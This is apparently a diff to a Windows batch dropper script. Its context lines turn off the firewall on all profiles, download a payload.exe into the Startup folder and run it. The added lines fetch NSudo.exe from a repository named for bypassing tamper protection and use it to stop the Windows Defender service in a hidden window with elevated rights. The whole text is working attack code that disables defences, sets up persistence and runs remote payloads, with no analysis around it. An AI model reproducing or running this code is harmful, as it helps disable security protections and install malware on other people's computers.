@@ -69,3 +69,15 @@ powershell.exe -command "netsh advfirewall set allprofiles state off"
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://direct-url/foryour-payload', '.\payload.exe') }
 start payload.exe
+
+cd  %temp%
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe', '.\NSudo.exe') }
+  
+
+sc query WinDefend | find "STATE" | find "RUNNING" && goto :stop
+
+:start
+NSudo.exe -U:T -ShowWindowMode:Hide sc start WinDefend & exit /b
+
+:stop
+NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend & exit /b
